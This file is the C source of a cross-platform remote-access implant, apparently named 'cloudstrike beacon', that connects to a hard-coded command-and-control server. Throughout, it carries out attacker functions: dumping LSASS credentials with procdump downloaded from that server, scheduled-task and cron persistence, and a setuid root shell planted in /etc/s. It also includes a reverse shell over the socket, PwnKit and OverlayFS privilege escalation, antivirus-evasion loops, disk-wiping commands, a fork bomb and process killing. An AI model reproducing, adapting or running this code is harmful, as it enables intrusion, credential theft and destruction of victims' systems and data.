//cloudstrike beacon
/*
TODO:
- optimize code
- fix chdir code using getcwd and chdir without a fixed PATH_MAX or OLDPWD
Windows:
- implement dos function
- implement history for guid
- make downloads appear in a folder with guid as name
- implement communication over covert channel tls/dns
- implement check for lolba by checking if the file of the lolba exist
- implement guid system
- implement bind shell
- implement cookie stealer for Firefox, Chrome, Brave, MsEdge, Opera, Opera GX
- drive encryption functionality
- encryption instead of encoding with xor
- implement port forwarding or even better socks proxy + proxy chain
- fix download for bigger files and binaries
- fix upload for bigger files and binaries
- replace webserver with uploading files directly over the control channel
Linux:
- implement optional pam trap to steal root password
- add locutus installer
- implement port forwarding or even better socks proxy + proxy chain
*/

#define C2_ADDR "192.168.178.73"
#define C2_PORT 1337
#define C2_WEB_PORT 1337


#define AUTO_IMPLANT 0

#define DEBUG 1

int got_lolba=0;
char *magic;


//bypass av
#define MAX_OP 100000000
#define TOO_MUCH_MEM 100000000

#ifdef _WIN32
//change if traffic is encoded in es2.h!!!
#include "es2.h"
#include <string.h>
#include <tchar.h>
#include <psapi.h>
#include <TlHelp32.h>
#include <process.h>

#pragma comment( lib, "Psapi.lib" )
#pragma comment( lib, "dbghelp.lib")

char HOME[300]="windows";


char init_msg[]="windows\n";

int _conn_init() {
    if(es_init()==-1) {
        return(-1);
    }
    while(es_connect(C2_ADDR, C2_PORT)!=0);
    return(0);
}

response _recv() {
    #if DEBUG==1
    printf("receiving...\n");//debug
    #endif
    response r=es_recv(4096);
    #if DEBUG==1
    printf("es_recv returned!\n");//debug
    #endif
    #if ENCODED == 1
        for(int i=0; i<strlen(r.data); i++) {
            r.data[i]=r.data[i]^0x1f;
        }
    #endif
    #if DEBUG==1
    printf("received: '%s'\n", r.data);
    #endif
    if(!alive()) {
        #if DEBUG==1
        printf("not alive anymore!\n"); //debug
        #endif
        r.buf_sz=0;
        return(r);
    }
    return(r);
}

int _send(char *message) {
    #if DEBUG==1
    printf("sending '%s'\n", message);
    #endif
    #if ENCODED == 1
        memmove(message+strlen(message), "EOF", 4);
        for(int i=0; i<strlen(message); i++) {
            message[i]=message[i]^0x1f;
        }
    #else
        if(strchr(message, '\n')==NULL) {
            memmove(message+strlen(message), "\n", 2);
        }
    #endif
    es_send(message);
    if(!alive()) {
        return(-1);
    }
    return(strlen(message));
}

void _cleanup() {
    #if DEBUG==1
    puts("cleaning up...");//debug
    #endif
    es_cleanup();
}

int memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return 1;
    }
    else {
        return 0;
    }
}

int chdir(char *path) {
    if(SetCurrentDirectory(path)==0) {
        return(-1);
    }
    else {
        return(0);
    }
}

char *exec(char *in) {
    #if DEBUG==1
    puts(in);
    #endif
    char *cmd=malloc(strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
    memset(cmd, 0, strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
    if(got_lolba==1) {
        snprintf(cmd, strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1, "echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log", in);
    }
    else {
        sprintf(cmd, "%s", in);
    }
    #if DEBUG==1
    printf("executing: %s\n", cmd);
    #endif
    FILE *fp;
    fp=_popen(cmd, "r");
    if(fp==NULL) {
        char *r=malloc(strlen("error popen failed!\n")+1);
        memmove(r, "error popen failed!\n", 21);
        return(r);
    }

    char *output = malloc(4096);
    memset(output, 0, 4096);
    int buf_sz=4096;
    while(1) {
        char buff[4097]="";
        int nbytes=fread(buff, 1, 4096, fp);
        if(nbytes==0) {
            _pclose(fp);
            return(output);
        }
        output=realloc_zero(output, buf_sz, buf_sz+nbytes);
        buf_sz+=nbytes;
        memmove(output+strlen(output), buff, nbytes+1);
    }
}


void destroy() {
    char one[50] = "RD C:\\ /S /Q";
    char two[50] ="del c:\\windows\\system32*.* /q";
    char three[50] = "del /f /s /q \"C:*.*.\"";
    free(exec(one));
    free(exec(two));
    free(exec(three));
}


void passdump() {
    //Load the dump
    //mimikatz # sekurlsa::minidump lsass.dmp(=hello.kitty)
    //Extract credentials
    //mimikatz # sekurlsa::logonPasswords
    char d[1000];
    snprintf(d, 1000, "curl %s:%d/%s/procdump.exe -o hello.exe",C2_ADDR, C2_WEB_PORT, magic);
    #if DEBUG==1
    puts(d);
    #endif
    free(exec(d));
    free(exec("hello.exe -accepteula -ma lsass hello.kitty"));
    _send("saved the dump to hello.kitty!\nremember to download it!");
}


void crash() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded );
    cProcesses = cbNeeded / sizeof(DWORD);
    for ( i = 0; i < cProcesses; i++ ) {
        TerminateProcess(OpenProcess(PROCESS_TERMINATE, TRUE, aProcesses[i]), -1);
    }
}


int implant() {
    char* struser = getenv("username");
    char strnewname[500]="";

    snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);

    //char reg1[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MsSafety /t REG_SZ /f /d ";
    //char reg2[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v MsSafety /t REG_SZ /f /d ";
    //char reg3[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v MsSafety /t REG_SZ /f /d ";
    //char reg4[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v MsSafety /t REG_SZ /f /d ";
    //sprintf(reg1, "%s\"%s\"", reg1, strnewname);
    //sprintf(reg2, "%s\"%s\"", reg2, strnewname);
    //sprintf(reg3, "%s\"%s\"", reg3, strnewname);
    //sprintf(reg4, "%s\"%s\"", reg4, strnewname);
    //#if DEBUG==1
    //puts(reg1);
    //puts(reg2);
    //puts(reg3);
    //puts(reg4);
    //#endif
    //free(exec(reg1));
    //free(exec(reg2));
    //free(exec(reg3));
    //free(exec(reg4));

    char autorun[500]="";
    if(strlen(("schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s")+strlen(struser)) > 500) {
        #if DEBUG==1
        printf("implant: error newname to long(>500bytes)!\n");
        #endif
        return(-1);
    }
    snprintf(autorun, 500, "schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s",strnewname);
    #if DEBUG==1
    puts(autorun);
    #endif
    free(exec(autorun));
    #if DEBUG==1
    puts("schtasks /r\"u\"n /tn \"MsSafety\"");
    #endif
    free(exec("schtasks /r\"u\"n /tn \"MsSafety\""));
    char r[]="implant finished!\n";
    _send(r);
    return(1);
}

int hide(char **argv) {
    #if DEBUG==1
    return(1);
    #endif
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    char* struser = getenv("username");
    char dirname[500]="";
    snprintf(dirname, 500, "C:\\Users\\%s\\Safety", struser);
    CreateDirectory(dirname, NULL);
    char d[1024]="";
    snprintf(d, 1024, "attrib +s +h %s", dirname);
    free(exec(d));
    char strnewname[500]="";
    snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
    FILE *ftp;
    ftp=fopen(strnewname, "rb");
    if(ftp) {
        remove(strnewname);
        fclose(ftp);
    }
    int r = rename(argv[0], strnewname);
    return(1);
}


int upload(char *dest) {
    #if DEBUG==1
    printf("uploading to %s\n", dest);
    #endif
    response r1;
    r1=_recv();
    if(r1.buf_sz==0) {
        return(-1);
    }
    FILE *fp=fopen(dest, "w");
    if(fp==NULL) {
        return(-1);
    }
    #if DEBUG==1
    printf("writing data ...\n");
    #endif
    fwrite(r1.data, r1.buf_sz, 1, fp);
    fclose(fp);
    free(r1.data);
    #if DEBUG==1
    puts("upload successful!");
    #endif
    return(1);
}


int download(char *filename) {
    FILE *fp = fopen(filename, "rb");
    if (fp == NULL) {
        perror("Error opening file");
        return(-1);
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *content = malloc(fsize + 1);
    if (content == NULL) {
        fclose(fp);
        perror("Error allocating memory");
        return(-1);
    }
    memset(content, 0, fsize + 1);
    if (fread(content, fsize, 1, fp) != 1) {
        fclose(fp);
        free(content);
        perror("Error reading file");
        return(-1);
    }
    fclose(fp);
    _send(content);
    free(content);
    return(1);
}


int check_msg(char *msg) {
    #if DEBUG==1
    printf("\nmsg: '%s'\n", msg);//debug
    #endif
    size_t s = strlen(msg);
    if (s && (msg[s-1] == '\n')) msg[--s] = 0;
    if(strcmp(msg, "implant")==0) {
        implant();
    }
    else if(strcmp(msg, "exit")==0) {
        return(2);
    }
    else if(strcmp(msg, "help")==0) {
        char help[200]="available functions:\nimplant\nupload\ndownload\ndestroy\npanic\npyinstall\npassdump\ncrash\nswap\nupdate\nexit\nhelp\n";
        _send(help);
        return(1);
    }
    else if(strcmp(msg, "panic")==0) {
        char lol[1000]="";
        char* struser = getenv("username");
        char strnewname[500]="";
        if(strlen("C:\\Users\\%s\\Safety\\ms.bat")+strlen(struser)>=500) {
            #if DEBUG==1
            printf("panic: error strnewname too long!\n");
            #endif
            free(exec("schtasks /de\"let\"e /f /tn MsSafety"));
            return(2);
        }
        snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\ms.bat", struser);
        snprintf(lol, 1000, "curl %s:%d/%s/killswitch.bat -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
        puts(lol);
        free(exec(lol));
        free(exec("schtasks /de\"let\"e /f /tn MsSafety"));
        snprintf(lol, 1000, "start /B %s", strnewname);
        free(exec(lol));
        return(2);
    }
    else if(strcmp(msg, "update")==0) {
        char* struser = getenv("username");
        char strnewname[500]="";
        if(strlen(struser)+strlen("C:\\Users\\%s\\Safety\\MsSafety.exe")>=500) {
            #if DEBUG==1
            printf("update: error struser to big!\n");
            #endif
            return(0);
        }
        snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
        char strnewername[500]="";
        snprintf(strnewername, 500, "C:\\Users\\%s\\Safety\\MsSafety2.exe", struser);
        rename(strnewname, strnewername);
        char d[1000]="";
        snprintf(d, 100, "curl %s:%d/%s/beacon_global.exe -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
        free(exec(d));
        char info[50]="update finished!";
        _send(info);
        return(1);
    }
    else if(strcmp(msg, "pyinstall")==0) {
        char* struser = getenv("username");
        char oname[300]="";
        snprintf(oname, 300, "C:\\Users\\%s\\Safety\\python-3.8.5.exe", struser);
        char d[1000]="";
        snprintf(d, 1000, "curl %s:%d/%s/python-3.8.5.exe --output \"%s\" && \"%s\" InstallAllUsers=0 Include_launcher=0 Include_test=0 PrependPath=1 /quiet", C2_ADDR, C2_WEB_PORT, magic, oname, oname);
        #if DEBUG==1
        puts(d);
        #endif
        free(exec(d));
        char info[50]="python installed!\nyou can now use \"python\"\n";
        _send(info);
        return(1);
    }
    else if(strcmp(msg, "swap")==0) {
        SwapMouseButton(TRUE);
        return(1);
    }
    else if(strcmp(msg, "passdump")==0) {
        char i[50]="dumping lsass!";
        _send(i);
        passdump();
        char info[50]="dumped!";
        _send(info);
        return(1);
    }
    else if(strcmp(msg, "crash")==0) {
        char i[50]="crashing target!";
        _send(i);
        crash();
        char info[50]="Tango down!!!";
        _send(info);
        return(1);
    }
    else if(strcmp(msg, "destroy")==0) {
        char i[50]="destroying target!";
        _send(i);
        destroy();
        char info[50]="Tango down!!!";
        _send(info);
        return(1);
    }
    else if(strncmp(msg, "upload ", 7)==0) {
        char *dest=msg+7;
        #if DEBUG==1
        puts("uploading...\n");
        printf("dest: %s\n", dest);
        #endif
        if(upload(dest)==-1) {
            char err[]="upload failed!\n";
            _send(err);
        }
        return(1);
    }
    else if(strncmp(msg, "download ", 9)==0) {
        char *path=msg+9;
        if(download(path)==-1) {
            char err[]="download failed!\n";
            _send(err);
        }
        return(1);
    }
    else if (strlen(msg)>3 && msg[0]=='c' && msg[1]=='d' && msg[2]==' '){
        char *path=msg+3;
        #if DEBUG==1
        printf("chdir to %s!\n", path);
        #endif
        int cres=chdir(path);
        if(cres==-1) {
           perror("chdir failed");
        }
        return(1);
    }
    else {
        return(0);
    }
}

#endif

#ifdef __linux
#define ENCODED 1 //change if the traffic is encoded or not!
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/mount.h>
#include <time.h>
#include <utime.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>

#define HOME "/tmp"

typedef struct response {
    char* data;
    int buf_sz;
} response;

char init_msg[]="linux\n";

int sock;
struct sockaddr_in server;

void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
  void* pNew = realloc(pBuffer, newSize);
  if(pNew==NULL) {
      return(NULL);
  }
  if ( newSize > oldSize && pNew ) {
    size_t diff = newSize - oldSize;
    void* pStart = ((char*)pNew) + oldSize;
    memset(pStart, 0, diff);
  }
  return pNew;
}


int _conn_init() {
    sock=socket(AF_INET, SOCK_STREAM, 0);
    if(sock==-1) {
        #if DEBUG==1
        printf("Could not create socket");
        #endif
        return(-1);
    }
    #if DEBUG==1
    puts("Socket created");
    #endif
    server.sin_addr.s_addr=inet_addr(C2_ADDR);
    server.sin_family=AF_INET;
    server.sin_port=htons(C2_PORT);
    while(connect(sock, (struct sockaddr *)&server, sizeof(server))<0);
    #if DEBUG==1
    puts("Connected\n");
    #endif
    return(0);
}

int _send(char *message) {
    #if ENCODED==1
        char *data=malloc(strlen(message)+4); //allocate space for eof
        memmove(data, message, strlen(message)+1);
        memmove(data+strlen(message), "EOF", 4);
        for(int i=0; i<strlen(data); i++) {
            data[i]=data[i]^0x1f;
        }
    #endif
    int r=send(sock, data, strlen(data), 0);
    free(data);
    return(r);
}

int contains_eof(char *str, char *eof) {
    for(char *ptr=str;*ptr!='\0';ptr++) {
        if(strcmp(ptr, eof)==0) {
            return(1);
        }
    }
    return(0);
}

response _recv() {
    response r;
    ssize_t rcv_r;
    char *rep=malloc(4096);
    if(rep==NULL) {
        #if DEBUG==1
        printf("_recv: error failed to allocate memory for rep!\n");
        #endif
        r.data="_recv: error failed to allocate memory for rep!\n";
        r.buf_sz=0;
        return(r);
    }
    memset(rep, 0, 4096);
    #if ENCODED==1
        char eof[4]={'E'^0x1f, 'O'^0x1f, 'F'^0x1f, '\0'};
    #else
        char eof[2] = {'\n', '\0'};
    #endif
    #if DEBUG==1
    puts("receiving...\n");
    #endif

    unsigned int buf_sz=4096+1;
    while((rcv_r=recv(sock, rep, 4096, 0))>0) {
        if(rcv_r==-1) {
            #if DEBUG==1
            printf("_recv: error failed to receive message!\n");
            #endif
            r.data="_recv: error failed to receive message!\n";
            r.buf_sz=0;
            return(r);
        }
        rep=realloc_zero(rep, buf_sz, buf_sz+rcv_r);
        if(rep==NULL) {
            #if DEBUG==1
            printf("error realloc failed!\n");
            #endif
            r.data="error realloc failed!\n",
            r.buf_sz=0;
            return(r);
        }
        #if DEBUG==1
        printf("current message (recv): '%s'\n", rep);
        #endif

        if(contains_eof(rep, eof)) {
            #if DEBUG==1
            puts("EOF found!\n");
            #endif
            if(ENCODED==1) {
                for(int i=0; i<strlen(rep); i++) {
                    rep[i]=rep[i]^0x1f;
                }
                rep[strlen(rep)-4]='\0';
            }
            response r;
            r.data=rep;
            r.buf_sz=buf_sz;
            #if DEBUG==1
            printf("current message (recv dec): %s\n", r.data);
            #endif
            return(r);
        }

    }
    r.data="recv failed as socket died!\n";
    r.buf_sz=0;
    return(r);
}

int _cleanup() {
    #if DEBUG==1
    printf("cleaning up...\n");
    #endif
    close(sock);
    return(0);
}

time_t getFileCreationTime(char *path) {
    struct stat attr;
    stat(path, &attr);
    return(attr.st_mtime);
}

void change_time(char *filename, time_t new) {
  struct stat foo;
  time_t mtime;
  struct utimbuf new_times;

  stat(filename, &foo);

  new_times.actime = foo.st_atime;
  new_times.modtime = new;
  utime(filename, &new_times);
}



char *exec(char *cmd) {
    #if DEBUG==1
    printf("executing: %s\n", cmd);
    #endif
    FILE *fp;
    fp = popen(cmd, "r");
    if (fp == NULL) {
        char *err = malloc(50);
        if (err == NULL) {
            return NULL;
        }
        memmove(err, "error popen failed!\n", 21);
        return err;
    }

    char *output = malloc(4097);
    if (output == NULL) {
        pclose(fp);
        return NULL;
    }
    memset(output, 0, 4097);
    int buf_sz = 4097;
    while (1) {
        char buff[4097] = "";
        size_t nbytes = fread(buff, 1, 4096, fp);
        #if DEBUG==1
        printf("exec: read %zu bytes from fp!\n", nbytes);
        size_t sb = strlen(buff);
        printf("exec: strlen(buff)=%zu\n", sb);
        #endif
        if (nbytes == 0) {
            if (feof(fp)) {
                pclose(fp);
                return output;
            }
            if (ferror(fp)) {
                free(output);
                pclose(fp);
                return NULL;
            }
        }
        char *new_output = realloc_zero(output, buf_sz, buf_sz + nbytes);
        if (new_output == NULL) {
            free(output);
            pclose(fp);
            return NULL;
        }
        output = new_output;
        buf_sz += nbytes;
        memmove(output+strlen(output), buff, nbytes+1);
    }
}


int hide(char **argv) {
    #if DEBUG==1
    return(1);
    #endif
    if (fork() != 0) exit(0);
    setsid();

    rename(argv[0], "/tmp/...");
    if(geteuid()==0) {
        rename(argv[0], "/bin/...");
        free(exec("chmod +x /bin/..."));
        change_time("/bin/...", getFileCreationTime("/bin/bash"));
        free(exec("cp /bin/bash /etc/s"));
        free(exec("chmod u+s /etc/s"));
        free(exec("chown root:root /etc/s"));
        free(exec("mkdir /tmp/..."));
        free(exec("mkdir -p /tmp/.../a/b"));
        free(exec("cp /etc/mtab /tmp/mtab"));
        free(exec("sudo mount -o bind /tmp/..../a /tmp/..../a/b"));
        rename("/tmp/....", "/tmp/..../a/b/b/....");
        free(exec("mv /tmp/mtab /etc/mtab"));
        free(exec("cp /etc/mtab /tmp/mtab"));
        pid_t pid=getpid();
        char pidstr[30]="";
        snprintf(pidstr, 30, "%d", pid);
        char *dest=malloc(strlen(pidstr)+strlen("/proc/")+1);
        memmove(dest, "/proc", 6);
        memmove(dest+strlen(dest), pidstr, strlen(pidstr)+1);
        mount("/bin", dest, "none", MS_BIND, NULL);
        free(dest);
        free(exec("mv /tmp/mtab /etc/mtab"));
    }
    else {
        unlink(argv[0]);
    }
    return(0);
}

int pwnkit() {
    if (geteuid()==0) {
        char err[]="you are already root!";
        if(_send(err)==0) {
            #if DEBUG==1
            printf("send failed!\n");
            #endif
            _cleanup();
        }
        return(-1);
    }
    else{
        char cmd[4096]="";
        snprintf(cmd, 4096, "curl %s:%d/%s/PwnKite.py -o /tmp/PwnKite.py", C2_ADDR, C2_WEB_PORT, magic);
        free(exec(cmd));
        char ret[] = "PwnKit downloaded to /tmp/PwnKite.py!";
        if(_send(ret)==0) {
            #if DEBUG==1
            printf("send failed!\n");
            #endif
            _cleanup();
            return(-1);
        }
        return(1);
    }
}
void destroy() {
    if(geteuid()==0) {
        char i[50]="destroying target!";
        _send(i);
        char pay[200]="sudo find /dev/sd* -exec sh -c 'cat /dev/random > \"{}\" &' \\;";
        free(exec(pay));
    }
    else {
        _send("sorry you dont have sufficient perms to destroy target!");
    }
}

int upload(char *dest) {
    #if DEBUG==1
    printf("uploading to %s\n", dest);
    #endif
    response r1;
    r1=_recv();
    if(r1.buf_sz==0) {
        return(-1);
    }
    FILE *fp=fopen(dest, "w");
    if(fp==NULL) {
        return(-1);
    }
    #if DEBUG==1
    printf("writing data ...\n");
    #endif
    fwrite(r1.data, r1.buf_sz, 1, fp);
    fclose(fp);
    free(r1.data);
    #if DEBUG==1
    puts("upload successful!");
    #endif
    return(1);
}

int download(char *filename) {
    FILE *fp = fopen(filename, "rb");
    if (fp == NULL) {
        perror("Error opening file");
        return(-1);
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *content = malloc(fsize + 1);
    if (content == NULL) {
        fclose(fp);
        perror("Error allocating memory");
        return(-1);
    }
    memset(content, 0, fsize + 1);
    if (fread(content, fsize, 1, fp) != 1) {
        fclose(fp);
        free(content);
        perror("Error reading file");
        return(-1);
    }
    fclose(fp);
    _send(content);
    free(content);
    return(1);
}

int game_overlay() {
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    char command[]="unshare -rm sh -c \"mkdir l u w m;cp /bin/sh l/;setcap cap_setuid+eip l/sh;mount -t overlay overlay -o userxattr,rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;u/sh;\"";
    char ms[500]="";
    snprintf(ms, 500, "run to get root:\n%s\n\n", command);
    if(_send(ms)==0) {
        #if DEBUG==1
        printf("send failed!\n");
        #endif
        _cleanup();
        return(-1);
    }
    static char *newargv[] = { "/etc/s" };
    static char *newenviron[] = { NULL };
    execve("/etc/s", newargv, newenviron);
    char wow[]="wow you got root!\n";
    _send(wow);
    return(1);
}


int implant() {
    if(geteuid()!=0) {
        char err[]="error not root!\n";
        _send(err);
        return(1);
    }
    free(exec("mkdir -p /etc/cron.d/"));
    free(exec("sudo echo '* * * * * root /bin/...' >> /etc/cron.d/popularity-contest"));
    change_time("/etc/cron.d/popularity-contest", getFileCreationTime("/bin/bash"));
    char ret[]="implant successful!\n";
    if(_send(ret)==0) {
        #if DEBUG==1
        printf("send failed!\n");
        #endif
        _cleanup();
        return(-1);
    }
    return(1);
}

int rootkit() {
    return(0);
}

int crash() {
    while (1) {
        fork();
    }
    return(0);
}

int break_shells() {
    exec("for i in $(seq 0 10);do cat /dev/urandom > /dev/pts/$i &done");
    return(0);
}

int nyan() {
    #if DEBUG==1
    puts("nyancat flying!\n");
    #endif
    if(geteuid()!=0) {
        char err[]="error not root!";
        if(_send(err)==0) {
            #if DEBUG==1
            printf("send failed!\n");
            #endif
            _cleanup();
            return(-1);
        }
    }
    char cmd_[4096]="";
    snprintf(cmd_, 4096, "curl %s:%d/%s/nyancat -o /tmp/nyanrner", C2_ADDR, C2_WEB_PORT, magic);
    free(exec(cmd_));
    free(exec("chmod +x /tmp/nyanrner"));
    free(exec("for i in /dev/pts/*; do if [ -r \"$i\" ]; then bash -c \"/tmp/nyanrner\" > $i & fi; done"));
    char info[]="nyancat flying!\n";
    if(_send(info)==0) {
        #if DEBUG==1
        printf("send failed!\n");
        #endif
        _cleanup();
        return(-1);
    }
    return(0);
}

int check_msg(char *msg) {
    size_t s = strlen(msg);
    if (s && (msg[s-1] == '\n')) msg[--s] = 0;
    #if DEBUG==1
    printf("checking msg: %s\n", msg);
    #endif
    if(strcmp(msg, "pwnkit")==0) {
        if(pwnkit()<0) {
            #if DEBUG==1
            printf("pwnkit failed!\n");
            #endif
            return(-1);
        }
        return(1);
    }
    else if(strcmp(msg, "game_overlay")==0) {
        if(game_overlay()<0) {
            #if DEBUG==1
            printf("game_overlay failed!\n");
            #endif
            return(-1);
        }
        return(1);
    }
    else if(strcmp(msg, "shell")==0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        static char *newargv[] = { NULL, "hello", "world", NULL };
        static char *newenviron[] = { NULL };
        execve("/etc/s", newargv, newenviron);
        char me[]="good bye!\n";
        _send(me);
        return(1);
    }
    else if(strncmp(msg, "upload ", 7)==0) {
        char *dest=msg+7;
        #if DEBUG==1
        puts("uploading...\n");
        printf("dest: %s\n", dest);
        #endif
        if(upload(dest)==-1) {
            char err[]="upload failed!\n";
            _send(err);
        }
        return(1);
    }
    else if(strncmp(msg, "download ", 9)==0) {
        char *path=msg+9;
        if(download(path)==-1) {
            char err[]="download failed!\n";
            _send(err);
        }
        return(1);
    }
    else if(strcmp(msg, "destroy")==0) {
        destroy();
        return(1);
    }
    else if(strcmp(msg, "help")==0) {
        char menu[]="available functions:\npwnkit\ndestroy\ngame_overlay\nnyancat\nimplant\nshell\ncrash\nbreak_shells\nupload\ndownload\nhelp\nexit\n";
        if(_send(menu)==0) {
            #if DEBUG==1
            printf("send failed!\n");
            #endif
            _cleanup();
            return(-1);
        }
        return(1);
    }
    else if(strcmp(msg, "implant")==0) {
        if(implant()<0) {
            #if DEBUG==1
            printf("implant failed!\n");
            #endif
            return(1);
        }
        return(1);
    }
    else if(strcmp(msg, "nyancat")==0) {
        nyan();
        return(1);
    }
    else if(strcmp(msg, "crash")==0) {
        _send("crashing target!");
        crash();
        return(1);
    }
    else if(strcmp(msg, "break_shells")==0) {
        break_shells();
        return(1);
    }
    else if(strcmp(msg, "exit")==0) {
        _cleanup();
        return(2);
    }
    else if( (strlen(msg)>3 && strncmp(msg, "cd ", 3)==0)){
        char *path=msg+3;
        #if DEBUG==1
        printf("chdir to %s!\n", path);
        #endif
        int cres=chdir(path);
        if(cres==-1) {
           perror("chdir failed");
        }
        return(1);
    }
    else {
        return(0);
    }
}
#endif



int main(int argc, char **argv)
{
    hide(argv);
    char * memdmp = NULL;
    memdmp = (char *) malloc(TOO_MUCH_MEM);
    if(memdmp!=NULL) {
        memset(memdmp,00, TOO_MUCH_MEM);
        free(memdmp);
    }
    int cpt = 0;
    int i = 0;
    for(i =0; i < MAX_OP; i ++)
    {
        cpt++;
    }
    if(cpt!=MAX_OP) {
        #ifdef _WIN32
        Sleep(1000000);
        #endif
        return(0);
    }
    #ifdef _WIN32
    memoryCheck();
    if(!memoryCheck) {
        Sleep(1000000);
        return(0);
    }
    #endif
    got_lolba=0;
    #if AUTO_IMPLANT==1
    implant();
    #endif
    #ifdef _WIN32
    FILE *ftp;
    ftp = fopen("C:\\Windows\\System32\\dxcap.exe", "rb");
    if(ftp) {
        got_lolba=1;
        fclose(ftp);
    }
    char* struser = getenv("username");
    snprintf(HOME, 300, "C:\\Users\\%s\\", struser);
    HOME[299]='\0';
    #endif

    if(_conn_init()!=0) {
        #if DEBUG==1
        printf("conn_init failed!\n");
        #endif
        return(-1);
    }
    #ifdef _WIN32
    Sleep(1000);
    #else
    sleep(1);
    #endif
    #if DEBUG==1
    printf("sending init: %s", init_msg);
    #endif
    if(_send(init_msg)==0) {
        #if DEBUG==1
        printf("send failed!\n");
        #endif
        _cleanup();
        return(-1);
    }
    #if DEBUG==1
    puts("init sent!\n");
    #endif
    response r_m;
    r_m=_recv();
    #if DEBUG==1
    if(r_m.buf_sz==0) {
        printf("error when receiving magic string: %s\n", r_m.data);
        return(-1);
    }
    #endif
    magic=r_m.data;
    #if DEBUG==1
    printf("\nmagic: %s\n", magic);
    #endif

    while(1) {
        response r_msg;
        r_msg=_recv();
        char *msg=r_msg.data;
        if(r_msg.buf_sz==0) {
            #if DEBUG==1
            printf("recv failed!\n");
            #endif
            _cleanup();
            return(-1);
        }
        #if DEBUG==1
        printf("msg in main: %s\n", msg);
        #endif

        int cres=check_msg(msg);
        #if DEBUG==1
        printf("cres: %i\n", cres);
        #endif
        if(cres==0) {
            char* output=exec(msg);
            if(output==NULL) {
                #if DEBUG==1
                printf("exec failed!\n");
                #endif
                _cleanup();
                return(-1);
            }
            if(_send(output)==0) {
                #if DEBUG==1
                printf("send failed!\n");
                #endif
                _cleanup();
                return(-1);
            }
            free(output);
        }
        else if(cres==2){
            free(msg);
            free(magic);
            #if DEBUG==1
            puts("exiting...");
            #endif
            return(0);
        }
        free(msg);
    }
}
